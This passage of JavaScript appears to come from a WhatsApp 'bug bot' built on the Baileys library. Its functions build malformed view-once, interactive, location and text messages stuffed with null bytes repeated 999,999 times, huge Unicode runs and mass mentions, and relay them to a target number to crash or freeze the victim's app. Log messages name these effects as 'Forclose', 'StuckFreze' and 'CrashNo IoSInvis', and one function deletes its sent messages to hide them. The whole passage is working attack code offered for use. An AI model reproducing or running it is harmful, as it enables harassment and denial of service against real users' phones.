            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    let radMsg1 = generateWAMessageFromContent(targetJid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    let radMsg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await sock.relayMessage("status@broadcast", radMsg1.message, {
        messageId: radMsg1.key.id,
        statusJidList: [targetJid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", radMsg2.message, {
        messageId: radMsg2.key.id,
        statusJidList: [targetJid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
            }]
        }]
    });
    let comboMsg = await generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: "0@s.whatsapp.net ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "0@s.whatsapp.net",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "TRIGGER SYSTEM",
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1
                        }
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", comboMsg.message, {
        messageId: comboMsg.key.id,
        statusJidList: [targetJid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
            }]
        }]
    });

    await sock.sendMessage(targetJid, {
        text: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        mentions: mentionedList
    });
 } catch (err) {
      console.error(err);
 }
console.log(chalk.red(`Success Sent DelayVolteX to ${targetJid}`))
}

async function VtxForceDelMsg2(targetJid) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "😈" + "ꦾ".repeat(100000),
            },
            footer: {
              text: "ꦾ".repeat(100000),
            },
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              isForwarded: true,
              forwardingScore: 999,
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
            },
          },
        },
      },
    };
const pertama = await sock.relayMessage(targetJid, message, {
      messageId: "",
      participant: { jid: targetJid },
      userJid: targetJid,
    });

    const kedua = await sock.relayMessage(targetJid, message, {
      messageId: "",
      participant: { jid: targetJid },
      userJid: targetJid,
    });

    await sock.sendMessage(targetJid, { 
      delete: {
        fromMe: true,
        remoteJid: targetJid,
        id: pertama,
      }
    });

    await sock.sendMessage(targetJid, { 
      delete: {
        fromMe: true,
        remoteJid: targetJid,
        id: kedua,
      }
    });

  } catch (err) {
    console.error("Send Forclose Erorr!", err);
  }
 console.log(chalk.red.bold("─────「 ⏤!New FCDelMsg!⏤ 」─────"))
}

async function NewProtocolbug6(targetJid) {
  try {
    let msg = await generateWAMessageFromContent(targetJid, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "ោ៝".repeat(10000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
              "6289501955295@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
              ],
              isForwarded: true,
              forwardingScore: 9999,
              forwardedNewsletterMessageInfo: {
                newsletterName: "sexy.com",
                newsletterJid: "333333333333333333@newsletter",
                serverMessageId: 1
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [targetJid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: targetJid }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
    console.log(chalk.red.bold("─────「 ⏤!Delay StuckFreze!⏤ 」─────"))
  } catch (err) {
    console.error("[bug error]", err);
  }
}

async function iosinVisFC(targetJid) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".welcomel...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      
      let msg1 = generateWAMessageFromContent(targetJid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let msg2 = generateWAMessageFromContent(targetJid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      for (const msg of [msg1, msg2]) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [targetJid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: targetJid
                  },
                  content: undefined
               }]
            }]
         }]
      });
     }
   console.log(chalk.red.bold("─────「 ⏤!CrashNo IoSInvis!⏤ 」─────"))
   } catch (err) {
      console.error(err);
   }
};